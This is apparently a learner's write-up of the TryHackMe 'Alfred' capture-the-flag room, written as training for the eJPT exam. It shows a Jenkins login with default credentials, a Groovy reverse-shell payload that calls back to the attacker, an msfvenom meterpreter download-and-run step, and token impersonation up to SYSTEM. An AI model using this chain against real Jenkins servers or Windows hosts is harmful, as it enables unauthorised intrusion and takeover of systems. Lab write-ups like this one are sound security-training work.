# Alfred — TryHackMe — SYSTEM

**Date:** 2026-09-25 (completed) — two prior partial days are part of this room's story
**Platform:** TryHackMe
**Outcome:** NT AUTHORITY\SYSTEM — **machine 13 (Phase B)**
**Time:** 40m completion run · Confidence self-rated 3/5
**Tools:** nmap (-Pn), Jenkins Script Console (native Groovy payload), nc, msfvenom (x86),
multi/handler, meterpreter (incognito: list_tokens/impersonate_token, migrate)

---

## 0. TL;DR chain

nmap -Pn (IIS 7.5 :80 · **Jetty/Jenkins :8080** · RDP :3389) → Jenkins login with shipped
defaults **admin:admin** → **Script Console** (a build server's job is running commands —
admin access = RCE by design, no CVE) → **native Groovy reverse-shell payload**
(ProcessBuilder + Socket pump) → nc-style shell as `alfred\bruce` → msfvenom **x86**
meterpreter exe → served + `DownloadFile` from the shell → handler on 5555 → meterpreter →
`load incognito` → `list_tokens -u` → **impersonate SYSTEM delegation token** → `getuid` =
SYSTEM → `migrate` into a stable process (668) → root flag

## 1. Recon

| Port | Service | Means | Therefore |
|---|---|---|---|
| 80 | IIS 7.5 | default site | RIP-Bruce page + donate email (flavor) |
| 3389 | ms-wbt-server | RDP | door for later creds; vanishes under -sV (filtered timing) |
| **8080** | **Jetty 9.4.z (Jenkins)** | CI/CD build server | **the attack surface** |

First scan said "Host seems down" on a live box — ping probes blocked. nmap printed its own
cure: **`-Pn`** (scan without host discovery). Applied unaided.

## 2. Vulnerability assessment

The vulnerability is not a bug. Jenkins ships with well-known defaults (**admin:admin**) and,
once logged in, exposes the **Script Console** — a Groovy interpreter with OS-level reach.
A CI/CD server's *purpose* is executing code on its host; in admin hands it's automation, in
ours it's RCE with a web form. Half of real-world breaches look like this: the vulnerability
is access.

## 3. Foothold (the payload that ended the war)

Injected straight into the Script Console — **in Groovy, the console's own language**:

```groovy
String host="<tun0>"; int port=4444; String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port); ...
while(!s.isClosed()){ /* pump bytes: socket→cmd stdin, cmd stdout→socket */ }
```

Read it as three facts: **ProcessBuilder** spawns `cmd.exe`; **Socket** dials the attacker;
the **while-loop** shuttles bytes between them — the same read-execute-reply pump as
mini-reverse.ps1, written natively. Caught on a plain listener.

**Why this worked where two days of alternatives didn't:** the earlier attempts made Groovy
*deliver PowerShell text* — three language borders (Groovy → Windows command line →
PowerShell), and quotes/tokenization died at every crossing. The Script Console speaks
Groovy; the payload that works is the one written *in Groovy*. **Inject in the
interpreter's own language; never smuggle a second language through it as cargo.**
(The room's own suggested line doesn't compile in Groovy — a known room wart.)

## 4. Privilege escalation (token impersonation — the third mechanism)

1. **Did (room-guided flow):** from the dumb shell, forged an upgrade: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 ...`
   — **x86 because the room states the box is 32-bit** — served it, `DownloadFile` from a
   one-shot `powershell -c "..."` (one-shot, not interactive: self-corrected), `Start-Process`,
   handler on 5555 → meterpreter as bruce.

2. **Did:** `load incognito` → `list_tokens -u` → delegation tokens include
   **NT AUTHORITY\SYSTEM** → `impersonate_token` → `getuid` = SYSTEM.
   **Why it works:** Windows caches access **tokens** per login/session; SYSTEM's token was
   sitting in the process's reach. Impersonation wears the token without ever cracking a
   password — authentication already happened, authorization just changes hands.

3. **Did:** `migrate 668` into a stable SYSTEM process. The impersonated token lives inside
   the payload process; migration moves the session somewhere durable. The migrate step was
   recommended by the AI reference (disclosed); the reasoning behind it — token dies with
   the payload process — was understood and retained.

**The trilogy, complete across three boxes:** Ice = UAC bypass + migrate · Steel Mountain =
service hijack (exe-service) · Alfred = **token impersonation** + migrate. Three mechanisms,
one goal: become what's already privileged.

## 5. Misses and dead ends

- **Two partial days on cross-language injection** before the native-Groovy payload ended it
  (day 3, mentor unreachable, Google AI used as reference — disclosed in the journal). The
  diagnostic work from those days was not wasted: the probes proved console execution
  (`alfred\bruce`) and network reach, which is what made the 40-minute run safe.
- **`powershell` interactive vs one-shot:** typing `powershell` then the command, versus
  `powershell -c "<command>"` as a single line. Self-diagnosed, self-corrected.
- **The PREFLIGHT checklist** (tun0 verified · file in served folder · URL port = server
  port · listener alive · ports in payload = listener port) was born on this machine after
  delivery-chain failures across two rooms. It is now permanent pre-trigger ritual — and an
  eJPT artifact, since the exam is open-book.

## 6. Lessons

1. **Inject in the interpreter's own language** — Groovy console, Groovy payload. Cross-language
   smuggling dies at the quote borders.
2. **Token impersonation:** tokens are wearable identity; incognito lists what's reachable;
   impersonate, then migrate for durability.
3. **Match the architecture:** the room said 32-bit → `-a x86`. Wrong arch = silent death.
4. **`-Pn`** when "host seems down" but the box is alive — ping-blocking is not absence.
5. **Default credentials are a real vulnerability class** — admin:admin on Jenkins is the
   Windows of forgotten padlocks.
